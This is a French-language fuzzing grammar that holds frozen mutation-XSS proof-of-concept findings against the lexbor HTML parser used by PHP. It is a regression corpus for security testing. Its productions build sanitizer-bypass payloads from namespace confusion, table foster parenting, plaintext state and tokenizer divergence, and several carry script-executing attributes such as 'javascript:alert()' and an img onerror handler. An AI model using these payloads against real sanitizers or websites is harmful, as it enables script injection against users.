# [PAI] mxss-findings.md (IA) — PROFIL : corpus de régression (PoC figés, spécifiques lexbor/php).
# Remplace l'ancien mxss-lexbor.overlay.md. NON générique par nature : ce sont des findings gelés.
# Origine productions : findings extraits de rules/mxss.md (Humain) ; mise en profil : (IA).
# Lançable seul : -g mxss-findings.md
!include mxss-vocab.md

## Rawtext en SVG via chaîne de namespaces (form+math+HIP+mglyph+svg)
<mxss_foreign_rawtext> = <lt>form<gt><mxss_foreign_confusion><lt>/form<gt><lt>form<gt><mxss_foreign_confusion><lt>path is='<mxss_rawtext_break>'<gt>
<mxss_foreign_rawtext> = <lt>form id='outer'<gt><mxss_foreign_confusion><lt>/form<gt><lt>form id='inner'<gt><mxss_foreign_confusion><lt>form id='outer'<gt><mxss_foreign_confusion><lt>/form<gt><lt>form id='inner'<gt><mxss_foreign_confusion><lt>table<gt><lt>tr<gt><mxss_rawtext_break><lt>/table<gt>

## PoC figés
# Foster parenting complexe table x SVG x select x math
<mxss_finding> = <lt>table<gt><mxss_foreign_confusion><lt>table<gt><mxss_foreign_confusion><lt>select<gt><mxss_foreign_confusion><lt>select<gt><mxss_foreign_confusion><lt>table<gt>
# select context bug : xmp dans caption
<mxss_finding> = <lt>table<gt><lt>caption<gt><mxss_foreign_rawtext><lt>select<gt><xss_exec_attr><gt><lt>/p<gt>
# AAA : <a> imbriqué via table
<mxss_finding> = <lt>a id=1<gt><lt>table<gt><lt>a id=2<gt>
<mxss_finding> = <lt>a id=1<gt><mxss_payload><lt>table<gt><lt>a id=2<gt>
# plaintext dans table -> foster parent -> PLAINTEXT state
<mxss_finding> = <lt>table<gt><lt>plaintext<gt><lt>a<gt>
<mxss_finding> = <lt>table<gt><lt>plaintext<gt><lt>a href='javascript:alert()'<gt>click
# <caption> comme foreign content breaker via SVG <title> HIP
<mxss_finding> = <lt>table<gt><lt>caption<gt><lt>svg<gt><lt>title<gt><lt>caption<gt><lt>/caption<gt><lt>/title<gt><lt>style<gt><lt>a id='<lt>/style<gt><xss_exec_attr>'<gt><lt>/a<gt><lt>/style<gt><lt>/svg<gt><lt>/caption<gt><lt>/table<gt>
# Divergence tokenizer : tagname numérique (<22 n'est pas un tag, §13.2.5.1)
<mxss_finding> = <lt>22 onerror='<lt>img src onerror=alert()<gt>'<gt>test<lt>/22<gt>

<mxss_payload nonrecursive=true p=0.1> = <lt>a<gt>SAFE FALLBACK AFTER TOO LONG RECURSION<lt>/a<gt>
<mxss_payload> = <mxss_finding>
<mxss_payload> = <mxss_foreign_rawtext>

<HTMLmxssElement root=true> = <mxss_payload>
